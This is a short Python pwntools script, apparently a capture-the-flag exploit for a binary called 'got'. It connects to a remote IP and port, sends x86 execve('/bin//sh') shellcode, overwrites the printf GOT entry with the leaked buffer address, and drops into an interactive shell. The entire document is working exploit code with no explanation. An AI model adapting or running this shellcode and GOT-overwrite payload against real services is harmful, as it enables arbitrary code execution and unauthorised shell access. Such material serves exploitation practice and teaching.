from pwn import *
import ctypes
context(log_level="debug")
#p = process("./got")
p = remote('128.199.220.74', 10002)
shellcode =  ''
shellcode +=  "\x31\xc0"  
shellcode +=  "\x50"  
shellcode +=  "\x68\x6e\x2f\x73\x68"  
shellcode +=  "\x68\x2f\x2f\x62\x69"  
shellcode +=  "\x89\xe3"  
shellcode +=   "\x50"  
shellcode +=   "\x53"  
shellcode +=   "\x89\xe1"  
shellcode +=   "\xb0\x0b"  
shellcode +=   "\xcd\x80"; 

printf_addr = 0x0804A018 


p.recvuntil("Your buffer locate at ")
shellcode_addr = int(p.recv(10),16)
payload1 = shellcode+'\x00'+p32(0xCAFEBABE)+ p32(printf_addr)
p.recvuntil("input:\n")
p.sendline(payload1)
p.recvuntil("\n")
p.sendline(str(ctypes.c_int(shellcode_addr).value))
p.interactive()



